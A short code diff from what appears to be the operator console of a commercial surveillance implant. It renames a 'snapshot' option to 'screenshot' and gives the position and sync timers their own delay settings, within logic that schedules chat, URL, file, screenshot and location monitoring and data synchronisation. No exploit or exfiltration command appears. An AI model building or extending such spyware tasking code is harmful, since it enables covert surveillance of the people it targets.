@@ -36,7 +36,7 @@ package it.ht.rcs.console.operations.view.configuration.basic
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
       if (model.file)       subactions.push({action: "module", module: "file",        status: "start"});
-      if (model.snapshot)   subactions.push({action: "module", module: "mouse",       status: "start"}); // I do not add snapshot here because, if enabled, it will have its own event/action
+      if (model.screenshot) subactions.push({action: "module", module: "mouse",       status: "start"}); // I do not add screenshot here because, if enabled, it will have its own event/action
       
       
       var startupEvent:Object =  {event: "timer", start: 0, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "STARTUP"};
@@ -46,17 +46,17 @@ package it.ht.rcs.console.operations.view.configuration.basic
       
       
       var index:int = 1;
-      if (model.snapshot) {
-        var snapshotEvent:Object =  {event: "timer", start: index, repeat: index, delay: model.snapshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SNAPSHOT"};
-        var snapshotAction:Object = {desc: "SNAPSHOT", subactions: [{action: "module", module: "snapshot", status: "start"}]};
-        events.push(snapshotEvent);
-        actions.push(snapshotAction);
+      if (model.screenshot) {
+        var screenshotEvent:Object =  {event: "timer", start: index, repeat: index, delay: model.screenshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SCREENSHOT"};
+        var screenshotAction:Object = {desc: "SCREENSHOT", subactions: [{action: "module", module: "screenshot", status: "start"}]};
+        events.push(screenshotEvent);
+        actions.push(screenshotAction);
         index++;
       }
       
       
       if (model.position) {
-        var positionEvent:Object =  {event: "timer", start: index, repeat: index, delay: model.snapshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "POSITION"};
+        var positionEvent:Object =  {event: "timer", start: index, repeat: index, delay: model.positionDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "POSITION"};
         var positionAction:Object = {desc: "POSITION", subactions: [{action: "module", module: "position", status: "start"}]};
         events.push(positionEvent);
         actions.push(positionAction);
@@ -65,7 +65,7 @@ package it.ht.rcs.console.operations.view.configuration.basic
       
       
       if (model.sync) {
-        var syncEvent:Object =  {event: "timer", repeat: index, delay: model.snapshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SYNC"};
+        var syncEvent:Object =  {event: "timer", repeat: index, delay: model.syncDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SYNC"};
         var syncAction:Object = {desc: "SYNC", subactions: [{action: "synchronize"}]};
         events.push(syncEvent);
         actions.push(syncAction);
